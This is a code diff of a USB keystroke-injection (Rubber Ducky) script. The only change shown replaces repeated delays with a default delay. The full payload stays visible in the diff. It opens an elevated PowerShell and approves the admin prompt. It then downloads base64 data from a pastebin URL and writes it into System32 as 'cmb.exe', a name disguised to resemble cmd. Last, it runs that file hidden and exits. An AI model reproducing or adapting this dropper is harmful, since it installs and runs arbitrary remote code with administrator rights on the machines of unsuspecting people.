@@ -1,21 +1,15 @@
+DEFAULT_DELAY 500
 DELAY 2000
 GUI R
-DELAY 1000
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 1000
 ALT y
-DELAY 1000
 STRING $downloadedString = (Invoke-webrequest -URI "https://pastebin.com/raw/cJS7SSxm")
 ENTER
-DELAY 1000
 STRING [IO.File]::WriteAllBytes("C:/Windows/System32/cmb.exe", [Convert]::FromBase64String($downloadedString))
 ENTER
-DELAY 1000
 STRING Start-Process -FilePath "C:/Windows/System32/cmb.exe" -WindowStyle Minimized
 ENTER
-DELAY 1000
 ALT TAB
-DELAY 1000
 STRING exit
 ENTER
